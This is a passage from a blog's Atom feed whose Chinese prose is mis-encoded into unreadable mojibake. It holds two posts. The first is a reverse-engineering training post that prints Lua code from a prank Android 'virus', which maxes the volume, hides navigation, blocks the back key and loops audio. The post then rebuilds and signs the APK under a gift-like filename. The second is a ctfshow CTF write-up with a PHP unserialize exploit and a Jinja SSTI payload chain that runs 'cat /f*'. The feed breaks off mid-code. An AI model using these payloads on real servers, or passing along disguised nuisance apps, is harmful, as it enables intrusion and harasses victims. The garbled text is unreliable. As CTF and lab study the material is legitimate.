punctuation">.</span>STREAM_MUSIC<span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> AudioManager<span class="token punctuation">.</span>FLAG_SHOW_UI<span class="token punctuation">)</span>  activity<span class="token punctuation">.</span><span class="token function">getDecorView</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setSystemUiVisibility</span><span class="token punctuation">(</span>View<span class="token punctuation">.</span>SYSTEM_UI_FLAG_HIDE_NAVIGATION <span class="token operator">|</span> View<span class="token punctuation">.</span>SYSTEM_UI_FLAG_IMMERSIVE<span class="token punctuation">)</span><span class="token keyword">end</span>ti<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">function</span> <span class="token function">onKeyDown</span><span class="token punctuation">(</span>A0_0<span class="token punctuation">,</span> A1_1<span class="token punctuation">)</span>  <span class="token keyword">if</span> string<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token function">tostring</span><span class="token punctuation">(</span>A1_1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"KEYCODE_BACK"</span><span class="token punctuation">)</span> <span class="token operator">~=</span> <span class="token keyword">nil</span> <span class="token keyword">then</span>    activity<span class="token punctuation">.</span><span class="token function">getSystemService</span><span class="token punctuation">(</span>Context<span class="token punctuation">.</span>AUDIO_SERVICE<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setStreamVolume</span><span class="token punctuation">(</span>AudioManager<span class="token punctuation">.</span>STREAM_MUSIC<span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> AudioManager<span class="token punctuation">.</span>FLAG_SHOW_UI<span class="token punctuation">)</span>  <span class="token keyword">end</span>  <span class="token keyword">return</span> <span class="token keyword">true</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…·ä½“çš„æ“ä½œæœ‰ä»¥ä¸‹å†…å®¹</p><ol><li><p>å°†ç³»ç»ŸéŸ³é‡è°ƒè‡³æœ€å¤§</p></li><li><p>éšè—ç³»ç»Ÿå¯¼èˆªæ ï¼Œå¹¶è¿›å…¥æ²‰æµ¸æ¨¡å¼ï¼ˆå…¨å±ï¼‰</p></li><li><p>æ¯10tickï¼Œé‡å¤ä»¥ä¸Šæ­¥éª¤ä½¿å¾—æ— æ³•ä¸»åŠ¨è°ƒä½éŸ³é‡</p></li><li><p>å¾ªç¯æ’­æ”¾éŸ³é¢‘æ–‡ä»¶0.mp3</p></li><li><p>é˜»æ­¢ä½¿ç”¨è¿”å›é”®</p></li></ol></li><li><p>ä½¿ç”¨ apktool å°†æ”¹æ–‡ä»¶å¤¹è¿›è¡Œå›ç¼–è¯‘ç”Ÿæˆæ–°çš„ç—…æ¯’æ–‡ä»¶</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> apktool_2.10.0.jar b ä¸€ä»½ç¤¼ç‰©<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>windowsä¸‹ç”±äºä¸­æ–‡è·¯å¾„çš„åŸå› æŠ¥é”™äº†ï¼Œè¿™é‡Œé€‰ç”¨wsl</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114214407985.png" alt="image-20241114214407985"></p></li><li><p>å°†æ–°çš„ test.apk æ–‡ä»¶ç”¨ auto-sign å·¥å…·è¿›è¡Œç­¾å</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> signapk.jar testkey.x509.pem testkey.pk8 test.apk é€ç»™æœ€å¥½çš„TA.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>å®‰è£… é€ç»™æœ€å¥½çš„TA.apk åˆ°æ¨¡æ‹Ÿå™¨å¹¶å¯åŠ¨</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114214837231.png" alt="image-20241114214837231"></p><p>ä¸€é˜µå¼ºåŠ²çš„éŸ³ä¹å“èµ·ï¼Œä¼¼ä¹æ˜¯ä¸€é¦–å¾ˆæ–°çš„æ­Œè•‰</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;æŸé€†å‘å®è®­è®°å½•&lt;/p&gt;</summary>
    
    
    
    <category term="Rev" scheme="http://c1oudfl0w0.github.io/blog/categories/Rev/"/>
    
    
  </entry>
  
  <entry>
    <title>ctfshow 2024å•èº«æ¯</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/11/11/ctfshow-%E5%8D%95%E8%BA%AB%E6%9D%AF/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/11/11/ctfshow-%E5%8D%95%E8%BA%AB%E6%9D%AF/</id>
    <published>2024-11-11T03:09:41.000Z</published>
    <updated>2024-11-13T06:06:09.605Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å®˜æ–¹wpï¼š<a href="https://ctf-show.feishu.cn/docx/R6udd58bxoQGQMxFphncZq8rn5e">https://ctf-show.feishu.cn/docx/R6udd58bxoQGQMxFphncZq8rn5e</a></p><span id="more"></span><hr><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ç­¾åˆ°Â·å¥½ç©çš„PHP"><a href="#ç­¾åˆ°Â·å¥½ç©çš„PHP" class="headerlink" title="ç­¾åˆ°Â·å¥½ç©çš„PHP"></a>ç­¾åˆ°Â·å¥½ç©çš„PHP</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshow</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">d</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">d</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">s</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">s</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">d</span> <span class="token operator">!=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">s</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">d</span> <span class="token operator">!=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">s</span> <span class="token operator">!=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$dsb</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">d</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">s</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$dsb</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">ctf</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$dsb</span> <span class="token operator">!==</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">ctf</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">ctf</span> <span class="token operator">!==</span> <span class="token variable">$dsb</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$dsb</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">ctf</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"dsbctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‘ç° ctf æ²¡è¢«è½¬æˆ stringï¼Œé‚£ä¹ˆå¯ä»¥ç»™ctfä¼ æ•°å­—</p><p>å…«è¿›åˆ¶è½¬åè¿›åˆ¶æ¯”è¾ƒå°±è¡Œ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshow</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'0'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token number">012</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="ezzz-ssti"><a href="#ezzz-ssti" class="headerlink" title="ezzz_ssti"></a>ezzz_ssti</h2><p>é™åˆ¶é•¿åº¦42</p><p>å‚æ•°å¸¦å¤–ç»•è¿‡ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>a<span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>os<span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>a<span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä½†æ˜¯æ­¤æ—¶æˆ‘ä»¬ä¾æ—§åªèƒ½æ§åˆ¶ä¸€ä¸ªå‚æ•°ï¼Œåè€…é•¿åº¦è¶…äº†1ä½</p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/weixin_43995419/article/details/126811287">https://blog.csdn.net/weixin_43995419/article/details/126811287</a></p><p>è®¾ç½®å¤šä¸ª config ä¸€å±‚å±‚å¸¦å‡ºæ•´ä¸ªpayload</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span><span class="token builtin">set</span> x<span class="token operator">=</span>config<span class="token punctuation">.</span>update<span class="token punctuation">(</span>l<span class="token operator">=</span>lipsum<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span><span class="token builtin">set</span> x<span class="token operator">=</span>config<span class="token punctuation">.</span>update<span class="token punctuation">(</span>u<span class="token operator">=</span>config<span class="token punctuation">.</span>update<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span><span class="token builtin">set</span> x<span class="token operator">=</span>config<span class="token punctuation">.</span>u<span class="token punctuation">(</span>g<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>a<span class="token operator">=</span>__globals__<span class="token punctuation">&#123;</span><span class="token operator">%</span><span class="token builtin">set</span> x<span class="token operator">=</span>config<span class="token punctuation">.</span>u<span class="token punctuation">(</span>o<span class="token operator">=</span>lipsum<span class="token punctuation">[</span>config<span class="token punctuation">.</span>g<span class="token punctuation">]</span><span class="token punctuation">.</span>os<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span><span class="token builtin">set</span> x<span class="token operator">=</span>config<span class="token punctuation">.</span>u<span class="token punctuation">(</span>f<span class="token operator">=</span>config<span class="token punctuation">.</span>l<span class="token punctuation">[</span>config<span class="token punctuation">.</span>g<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token punctuation">.</span>f<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat /f*'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="ez-inject"><a href="#ez-inject" class="headerlink" title="ez_inject"></a>ez_inject</h2><p><img src="/blog/2024/11/11/ctfshow-%E5%8D%95%E8%BA%AB%E6%9D%AF/image-20241111131747063.png" alt="image-20241111131747063"></p><p>åˆ†æä¸€ä¸‹sessionçš„ç»„æˆï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token string">'echo_message'</span><span class="token punctuation">:</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'is_admin'</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'username'</span><span class="token punctuation">:</span><span class="token string">'1'</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆ‘ä»¬å¯æ§çš„éƒ¨åˆ†æ˜¯ echo_message å’Œ usernameï¼Œæ²¡å•¥ç”¨</p><p>æµ‹è¯•å‘ç° &#x2F;register å¯ä»¥ä¼ å…¥json</p><p><img src="/blog/2024/11/11/ctfshow-%E5%8D%95%E8%BA%AB%E6%9D%AF/image-20241111210809381.png" alt="image-20241111210809381"></p><p>ç›´æ¥æ‰“åŸå‹é“¾æ±¡æŸ“ static è¯•è¯•</p><p><img src="/blog/2024/11/11/ctfshow-%E5%8D%95%E8%BA%AB%E6%9D%AF/image-20241111211011960.png" alt="image-20241111211011960"></p><p>ç„¶åç›´æ¥è®¿é—® static&#x2F;flag å¾—åˆ°flag</p><br><p>é¢„æœŸè§£ï¼šæ±¡æŸ“keyæ”¹sessionï¼Œåœ¨ &#x2F;echo å¤„æ‰“ssti</p><hr><h2 id="è¿·é›¾é‡é‡"><a href="#è¿·é›¾é‡é‡" class="headerlink" title="è¿·é›¾é‡é‡"></a>è¿·é›¾é‡é‡</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">support<span class="token punctuation">\</span>Request</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">support<span class="token punctuation">\</span>exception<span class="token punctuation">\</span>BusinessException</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexController</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token class-name type-declaration">Request</span> <span class="token variable">$request</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token function">view</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index/index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">testUnserialize</span><span class="token punctuation">(</span><span class="token class-name type-declaration">Request</span> <span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">null</span> <span class="token operator">!==</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"unserializeæµ‹è¯•å®Œæ¯•"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">testJson</span><span class="token punctuation">(</span><span class="token class-name type-declaration">Request</span> <span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">null</span> <span class="token operator">!==</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token operator">!==</span> <span class="token variable">$data</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token function">view</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index/view'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"json_decodeæµ‹è¯•å®Œæ¯•"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">testSession</span><span class="token punctuation">(</span><span class="token class-name type-declaration">Request</span> <span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$session</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$session</span><span class="token operator">-></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"guest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$session</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"sessionæµ‹è¯•å®Œæ¯• username: "</span><span class="token operator">.</span><span class="token variable">$data</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">testException</span><span class="token punctuation">(</span><span class="token class-name type-declaration">Request</span> <span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">null</span> <span class="token operator">!=</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BusinessException</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ä¸šåŠ¡å¼‚å¸¸ "</span><span class="token operator">.</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"exceptionæµ‹è¯•å®Œæ¯•"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»™äº†ä¸ªunserializeï¼Œjsonæ¨¡æ¿æ¸²æŸ“ï¼Œsession å’Œä¸€ä¸ªæŠ›å‡ºå¼‚å¸¸</p><p>è§‚å¯Ÿæ¨¡æ¿æ¸²æŸ“çš„é…ç½®ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">testJson</span><span class="token punctuation">(</span><span class="token class-name type-declaration">Request</span> <span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">null</span> <span class="token operator">!==</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token operator">!==</span> <span class="token variable">$data</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">view</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index/view'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token string double-quoted-string">"json_decodeæµ‹è¯•å®Œæ¯•"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">view</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$template</span><span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$vars</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$app</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$plugin</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name return-type">Response</span><span class="token punctuation">&#123;</span>    <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token function"><span class="token punctuation">\</span>request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$plugin</span> <span class="token operator">=</span> <span class="token variable">$plugin</span> <span class="token operator">===</span> <span class="token constant">null</span> <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-></span><span class="token property">plugin</span> <span class="token operator">??</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token variable">$plugin</span><span class="token punctuation">;</span>    <span class="token variable">$handler</span> <span class="token operator">=</span> <span class="token function"><span class="token punctuation">\</span>config</span><span class="token punctuation">(</span><span class="token variable">$plugin</span> <span class="token operator">?</span> <span class="token string double-quoted-string">"plugin.<span 